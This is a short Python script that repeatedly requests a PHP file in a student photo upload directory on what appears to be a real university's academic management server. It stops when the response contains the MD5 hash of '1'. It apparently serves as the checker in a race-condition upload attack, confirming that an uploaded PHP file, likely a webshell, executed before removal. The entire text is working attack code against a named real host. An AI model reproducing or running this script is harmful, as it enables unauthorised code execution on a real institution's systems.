# coding:utf-8
import requests
def main():
    i=0
    while 1:
        try:
            print(i,end='\r')
            a = requests.get("http://jwgl.ncist.edu.cn//_photo/Student/TonyD0g.php")
            if "c4ca4238a0b923820dcc509a6f75849b" in a.text:
                print("OK")
                break
        except Exception as e:
            pass
        i+=1
if __name__ == '__main__':
    main()